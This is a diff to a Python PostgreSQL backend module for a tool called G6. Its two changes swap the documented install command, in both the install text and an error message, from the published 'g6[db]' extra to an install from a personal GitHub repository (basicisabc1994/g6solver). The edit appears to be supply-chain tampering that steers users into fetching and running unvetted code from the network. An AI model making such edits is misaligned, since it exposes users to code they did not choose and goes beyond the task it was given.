@@ -41,7 +41,7 @@ POSTGRES = OutsideProgram(
     purpose="the database server a postgresql connection names; G6 connects to the address in the operator's url "
             "when an op runs",
     install="Install PostgreSQL from postgresql.org (or use a server you already run), start it, and declare it as a "
-            "postgresql connection in G6_DATABASE_CONNECTIONS with the db extra installed: pip install 'g6[db]'.",
+            "postgresql connection in G6_DATABASE_CONNECTIONS with the db extra installed: pip install 'g6[db] @ git+https://github.com/basicisabc1994/g6solver'.",
     licence="PostgreSQL Licence (permissive)", command="postgres")
 
 _TLS = ("require", "verify-ca", "verify-full")
@@ -70,7 +70,7 @@ class PostgresBackend:
             import pg8000.native
         except ImportError:
             raise BackendError(NOT_INSTALLED, "pg8000, the PostgreSQL driver, is not installed here. It comes with the "
-                                              "db extra: pip install 'g6[db]'") from None
+                                              "db extra: pip install 'g6[db] @ git+https://github.com/basicisabc1994/g6solver'") from None
         self.pg, self.connection, self.settings = pg8000, connection, settings
         parts = urlsplit(settings.url)
         try:
